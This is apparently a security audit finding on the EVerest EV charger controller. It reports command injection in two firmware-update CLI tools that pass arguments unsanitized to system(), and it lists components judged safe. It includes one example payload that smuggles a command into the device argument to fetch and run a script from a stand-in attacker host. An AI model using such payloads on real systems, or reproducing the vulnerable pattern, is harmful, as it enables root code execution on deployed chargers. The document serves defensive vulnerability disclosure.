## Security Analysis Findings

After examining hundreds of source files across the EVerest EV charging station controller codebase, I found **OS Command Injection** vulnerabilities in two firmware update CLI utilities.

### Vulnerable Files

**1. `/work/modules/HardwareDrivers/EVSE/YetiDriver/yeti_fwupdate/main.cpp`** (line 72):
```cpp
sprintf(cmd, "stm32flash -b 115200 %.100s -v -w %.100s -R", device, filename.string().c_str());
system(cmd);
```

**2. `/work/modules/HardwareDrivers/EVSE/MicroMegaWattBSP/umwc_fwupdate/main.cpp`** (line 70):
```cpp
sprintf(cmd, "stm32flash -b 115200 %.100s -v -w %.100s -R", device, filename);
system(cmd);
```

### Why This Is a Vulnerability

Both tools accept `argv[1]` (device) and `argv[2]` (firmware filename) from the command line and pass them unsanitized into `system()`. While `%.100s` prevents buffer overflow (100-char limit in a 1000-char buffer), it **does not prevent command injection**. Shell metacharacters in the input (e.g., `;`, `` ` ``, `$()`, `|`) are interpreted by the shell invoked by `system()`.

Example payload for `device` argument: `/dev/ttyS0; curl http://attacker.com/evil.sh | sh`

These tools run with elevated privileges (root for serial/GPIO hardware access) on the EV charging station. These are compiled and deployed as part of the standard EVerest build system.

### Attack Surface

While these are CLI tools requiring local execution, the EVerest system is an embedded Linux EV charger controller where:
- Firmware update tools are invoked by the main system module during OTA updates
- An attacker who gains any level of shell access (e.g., through physical access, MQTT network access, or compromised OCPP central system) can use these vectors to execute arbitrary commands as root

### Areas Confirmed Not Vulnerable

- **OCPP message handling**: The `run_application()` function uses `boost::process::args()` which passes arguments via argv (no shell interpretation)
- **Shell scripts**: Use proper `"${N}"` double-quoting, preventing both command injection and curl option injection
- **RAUC (firmware update daemon)**: Uses DBus IPC, not shell execution
- **TLS library**: Proper use of OpenSSL APIs
- **SQLite**: Uses parameterized queries via `sqlite3_bind_text()`
